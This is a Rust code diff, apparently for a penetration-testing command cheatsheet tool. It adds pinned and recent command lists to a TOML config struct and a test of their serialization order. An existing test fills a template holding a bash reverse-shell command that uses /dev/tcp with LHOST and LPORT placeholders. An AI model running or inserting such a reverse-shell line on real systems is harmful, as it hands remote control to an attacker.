@@ -45,8 +45,16 @@ struct CommandFileOut<'a> {
 }
 
 /// Config = the persisted variable values.
+// NOTE: array fields are declared BEFORE `vars` so toml serializes them first;
+// a TOML table must come after top-level keys or those keys nest under it.
 #[derive(Debug, Default, Serialize, Deserialize)]
 pub struct Config {
+    /// Pinned command keys ("category/name").
+    #[serde(default)]
+    pub favorites: Vec<String>,
+    /// Recently copied/run command keys, most-recent first.
+    #[serde(default)]
+    pub recent: Vec<String>,
     #[serde(default)]
     pub vars: BTreeMap<String, String>,
 }
@@ -222,6 +230,23 @@ mod tests {
         v.insert("LPORT".to_string(), "".to_string());
         let out = fill_template("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1", &v);
         assert_eq!(out, "bash -i >& /dev/tcp/10.10.14.5/<LPORT> 0>&1");
+    }
+
+
+    #[test]
+    fn config_roundtrip_order() {
+        let mut c = Config::default();
+        c.favorites.push("nmap/Quick".into());
+        c.recent.push("web/ffuf".into());
+        c.vars.insert("RHOST".into(), "10.0.0.1".into());
+        let txt = toml::to_string_pretty(&c).unwrap();
+        // arrays must appear before the [vars] table
+        let fav_pos = txt.find("favorites").unwrap();
+        let vars_pos = txt.find("[vars]").unwrap();
+        assert!(fav_pos < vars_pos, "bad order:\n{txt}");
+        let back: Config = toml::from_str(&txt).unwrap();
+        assert_eq!(back.favorites, vec!["nmap/Quick".to_string()]);
+        assert_eq!(back.vars.get("RHOST").unwrap(), "10.0.0.1");
     }
 
     #[test]
